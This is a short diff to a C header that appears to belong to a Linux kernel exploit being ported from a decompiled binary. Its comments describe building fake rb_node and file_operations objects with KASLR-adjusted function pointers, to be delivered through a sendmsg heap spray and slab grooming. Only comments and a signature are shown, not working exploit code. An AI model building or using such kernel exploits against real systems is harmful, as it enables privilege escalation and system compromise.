@@ -1,5 +1,5 @@
-#ifndef OSS_CLONE_FOPS_INSTALL_H
-#define OSS_CLONE_FOPS_INSTALL_H
+#ifndef OSS_CLONE_FAKE_KERNEL_OBJECTS_H
+#define OSS_CLONE_FAKE_KERNEL_OBJECTS_H
 
 #include <stdint.h>
 
@@ -57,9 +57,9 @@
  *     0, 0} -- same parent_color value as the waiter's pi_tree_entry.
  *   scratch+0x5550  extra fake rb_node (LEFT_OFF): identical to RIGHT_OFF.
  *
- * This function only builds the bytes; it does not spray them into the
- * kernel yet (that is FUN_00106288's earlier sendmsg step, still being
- * ported) and does not touch any kernel object. Safe to call/test
+ * This function only builds the bytes. Socket delivery is handled by
+ * 05_mm_slab_grooming.c; this function does not touch any kernel object.
+ * Safe to call/test
  * standalone. kernel_base is the already-resolved KASLR base (needed to
  * compute the real function-pointer values above). */
 void build_fops_install_object(unsigned char *scratch, uint64_t aligned_base,
